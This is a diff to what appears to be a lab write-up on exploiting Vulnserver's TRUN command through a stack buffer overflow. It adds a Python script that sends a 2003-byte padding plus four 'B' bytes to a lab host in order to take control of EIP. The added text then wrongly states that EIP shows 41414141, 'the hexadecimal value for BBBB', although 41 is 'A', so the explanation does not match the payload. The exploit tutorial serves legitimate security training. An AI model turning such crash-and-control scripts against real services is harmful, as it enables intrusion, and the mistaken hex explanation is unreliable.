@@ -142,3 +142,38 @@ the -l flag e.g. -l 2400 and use the flag -q to include our EIP 386F4337 e.g. -g
 ![exp6](/images/vulnserver/stack/exp6.PNG)
 
 We have our offset at 2003 bytes.
+
+Now that we have our offset lets modify the python script to include the offset
+
+```python
+#!/usr/bin/python
+import sys, socket
+
+
+host = "192.168.209.133"
+port = 9999
+
+shellcode = "A" * 2003 + "B" * 4
+while True:
+         try:
+                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                s.connect((host,port))
+                s.send(('TRUN /.:/' + shellcode))
+                s.close()
+                     
+         except:
+                 print "Unable to connect to the server"
+                 sys.exit()
+        
+```
+
+Here we added a new variable `shellcode` in which we included the following
+* "A" * 2003 - this is our offset
+* "B" * 4 - These should show up in EIP and we know we can control it
+
+
+Next we execute the python script and check Immunity and we can see that we have overwritten the EIP with **41414141** which is 
+hexadecimal value for "BBBB"
+
+![exp7](/images/vulnserver/stack/exp7.PNG)
+
